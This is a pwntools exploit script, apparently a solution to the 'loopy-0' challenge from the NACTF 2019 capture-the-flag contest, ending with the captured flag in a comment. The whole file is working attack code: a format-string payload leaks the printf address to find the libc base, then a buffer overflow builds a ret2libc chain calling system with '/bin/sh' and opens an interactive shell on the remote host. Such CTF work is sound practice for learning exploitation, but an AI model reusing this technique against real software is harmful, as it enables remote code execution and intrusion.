from pwn import *
import sys
# context.log_level = "debug"
elf = ELF('./loopy-0')

remote_flag = 0
if len(sys.argv) > 1:
    if sys.argv[1] == 'remote':
        remote_flag = 1

if remote_flag:
    libc = ELF('./libc.so.6')  # remote
    p = remote('shell.2019.nactf.com',31283)
else:
    p = process('./loopy-0')
    libc = ELF('/root/software/glibc-all-in-one/libs/2.23-0ubuntu10_i386/libc.so.6')
payload = ''
payload += p32(0x804c00c)
payload += '%4$s'
payload = payload.ljust(76,'a')
payload += p32(0x080491E7)
p.recvuntil('Type something>')
p.sendline(payload)
p.recvuntil('You typed: ')
PRINTF_ADDR = u32(p.recv(8)[4:])
print(hex(PRINTF_ADDR))
print_offset = libc.symbols['printf']
print(hex(print_offset))
libc_base = PRINTF_ADDR - print_offset
print(hex(libc_base))
system = p32(libc_base + libc.symbols['system'])
fakeret = 'BBBB'

if remote_flag:
    binsh = p32(libc_base + 0x17eaaa)
else: 
    binsh = p32(libc_base + 0x15ba0b)  # local

payload2 = 'A' * 76 + system + fakeret + binsh
p.sendline(payload2)
p.interactive()

# nactf{jus7_c411_17_4g41n_AnZPLmjm}
